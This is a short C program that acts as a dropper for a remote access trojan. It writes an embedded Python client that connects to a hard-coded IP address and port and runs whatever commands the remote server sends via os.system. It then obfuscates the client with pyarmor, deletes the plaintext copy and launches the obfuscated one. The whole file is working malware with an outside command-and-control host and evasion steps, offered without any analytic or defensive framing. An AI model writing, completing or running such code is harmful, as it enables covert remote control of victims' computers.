#include <stdio.h>
#include <stdlib.h>

int main() {
    system("pip install -U pyarmor");
    system("mkdir rat");

    FILE *file = fopen("rat/client.py", "w");
    if (file == NULL) {
        printf("Error opening file.");
        return 1;
    }

    fputs("\nimport socket\nimport os\nimport random\nimport time\n\n\nhost = '26.199.90.194'\nport = 12345\ncalc = 'C:/Windows/System32/calc.exe'\nclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n\nclient_socket.connect((host, port))\n\nprint('Client started...')\n\nwhile True:\n\ttry:\n\t\tdata = client_socket.recv(1024)\n\t\tserver_answer = data.decode().split()\n\t\tif server_answer[0]=='run':\n\t\t\tif server_answer[1]=='-s':\n\t\t\t\tis_system = 'C:/Windows/System32/'+server_answer[2]\n\t\t\t\tos.system(is_system)\n\t\t\t\tanswer_for_server = f'RUN: {server_answer[2]}'\n\t\t\t\t\n\t\t\telse:\n\t\t\t\tos.system(server_answer[1])\n\t\t\t\tanswer_for_server = f'RUN: {server_answer[1]}'\n\t\t\t\t\n\t\tclient_socket.send(answer_for_server.encode())\n\n\texcept KeyboardInterrupt:\n\t\tprint('Blya menya etim hetel vikluchit? Dolbaeb')\n\texcept socket.error as e:\n\t\tprint(f'Error: {e}')\n\t\tprint('sleep')\n\t\ttime.sleep(random.randint(0, 10))\n\t\tclient_socket.connect((host, port))\n\t\tprint('unsleep')\n\nclient_socket.close()\n", file);

    fclose(file);

    system("pyarmor g rat/client.py");
    system("del /s /q  rat");
    system("python dist/client.py");
    

    return 0;
}